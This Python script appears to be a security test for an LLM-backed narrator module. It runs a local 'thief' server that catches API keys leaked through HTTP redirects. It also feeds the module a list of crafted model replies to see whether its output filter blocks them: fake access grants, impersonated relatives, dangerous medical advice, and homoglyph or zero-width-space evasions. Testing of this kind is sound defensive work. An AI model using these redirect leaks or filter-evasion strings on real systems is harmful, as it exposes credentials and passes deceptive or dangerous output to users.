import json, os, sys, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
REPO = str(__import__("pathlib").Path(__file__).resolve().parents[4]); sys.path.insert(0, REPO)
seen = []; reply = {"text": ""}
class Thief(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_GET(self):
        seen.append(("thief", self.command, self.headers.get("Authorization")))
        b=json.dumps({"choices":[{"message":{"content":"stolen ok"}}]}).encode()
        self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    do_POST = do_GET
thief = ThreadingHTTPServer(("127.0.0.1",0),Thief); threading.Thread(target=thief.serve_forever,daemon=True).start()
class Prov(BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_POST(self):
        self.rfile.read(int(self.headers["Content-Length"]))
        if self.path.startswith("/redir"):
            code = int(self.path.split("/")[2])
            self.send_response(code); self.send_header("Location", f"http://localhost:{thief.server_port}/x"); self.send_header("Content-Length","0"); self.end_headers(); return
        b=json.dumps({"choices":[{"message":{"content":reply["text"]}}]}).encode()
        self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
prov = ThreadingHTTPServer(("127.0.0.1",0),Prov); threading.Thread(target=prov.serve_forever,daemon=True).start()
os.environ.update(NVIDIA_API_KEY="nvapi-SECRET", CONTINUUM_LLM_PROVIDER="nvidia")
from continuum_web import narrator as N
for code in (301,302,303,307,308):
    seen.clear(); os.environ["CONTINUUM_NVIDIA_BASE_URL"]=f"http://127.0.0.1:{prov.server_port}/redir/{code}"
    try: out = N.narrate("q","a",["e"]); res="returned "+repr(out)
    except N.NarrationError as e: res="error "+str(e)
    print(f"C2 {code}: thief saw {seen} | {res}")
os.environ["CONTINUUM_NVIDIA_BASE_URL"]=f"http://127.0.0.1:{prov.server_port}"
variants = [
 "Access granted.", "You're authorized to open the vault.", "Your identity is confirmed.",
 "Access is granted to you as heir.", "You now have access to everything.", "ACCESS  GRANTED",
 "Acceso concedido.", "Estás autorizado a abrir la bóveda.", "Tu identidad fue verificada.",
 "Accès accordé.", "I am your father and I want you to have the house.",
 "Soy tu mamá; quiero que te quedes con la casa.", "As your grandmother, I forgive you.",
 "You should sell the apartment now and invest in bonds.", "Stop taking the penicillin, it is safe.",
 "Accеss granted", "access​ granted",
]
for v in variants:
    reply["text"]=v
    try: N.narrate("q","a",["e"]); print("C1 PASSED THROUGH:", repr(v))
    except N.NarrationError as e: print("C1 withheld:", repr(v))
